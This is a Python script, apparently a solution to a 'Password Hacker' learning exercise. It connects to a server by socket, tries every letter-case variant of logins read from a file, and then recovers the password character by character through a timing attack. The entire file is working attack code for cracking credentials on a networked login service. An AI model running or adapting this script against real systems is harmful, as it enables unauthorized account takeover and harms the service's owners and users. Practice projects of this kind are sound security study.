import argparse
import socket
import itertools
import json
from string import ascii_letters, digits
from datetime import datetime, time


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    parser.add_argument('port')
    args = parser.parse_args()
    return args


class PasswordHacker:

    def __init__(self, ip, port):
        self.address = (ip, int(port))
        self.socket = self.set_connection()

    def set_connection(self):
        my_socket = socket.socket()
        my_socket.connect(self.address)
        return my_socket

    def close_connection(self):
        self.socket.close()

    def send_message(self, login, password):
        user_data = {"login": login, "password": password}
        json_user_data = json.dumps(user_data)
        self.socket.send(json_user_data.encode())

    def get_response(self):
        response = self.socket.recv(1024)
        return json.loads(response)

    def generate_password(self):
        logins = self.create_login_list()
        password = ' '
        for word in logins:
            word_variants = self.create_lettercase_variants(word)
            for login in word_variants:
                response = self.send_data(login, password)
                if response == 'Wrong password!':
                    password = self.validate_password(login)
                    json_data = json.dumps({"login": login, "password": password})
                    return json_data

    def validate_password(self, login):
        symbols = self.create_symbols_list()
        password = ''
        while True:
            for i in symbols:
                start = datetime.now()
                response = self.send_data(login, password + i)
                end = datetime.now()
                process_time = end - start
                if (datetime.min + process_time).time() > time(0, 0, 0, 50000):
                    password += i
                    break
                elif response == 'Connection success!':
                    password += i
                    return password

    def send_data(self, login, password):
        self.send_message(login, password)
        response = self.get_response()
        return response['result']

    def create_lettercase_variants(self, word):
        letter_variants = [(i.lower(), i.upper()) for i in word]
        variants = itertools.product([0, 1], repeat=len(word))
        passwords_variants = []
        for i in variants:
            password = ''
            for num, j in enumerate(i):
                password += letter_variants[num][j]
            passwords_variants.append(password)
        return passwords_variants

    def create_password_list(self):
        with open(
                r'C:\Users\Owner\PycharmProjects\Password Hacker\Password Hacker\task\hacking\passwords.txt'
        ) as password_file:
            passwords_list = password_file.read().splitlines()
        return passwords_list

    def create_login_list(self):
        with open(
                r'C:\Users\Owner\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt'
        ) as login_file:
            logins_list = login_file.read().splitlines()
        return logins_list

    def create_symbols_list(self):
        return list(ascii_letters + digits)


if __name__ == '__main__':
    args = parse_args()
    ip, port = args.ip, args.port
    password_hacker = PasswordHacker(ip, port)
    print(password_hacker.generate_password())
    password_hacker.close_connection()
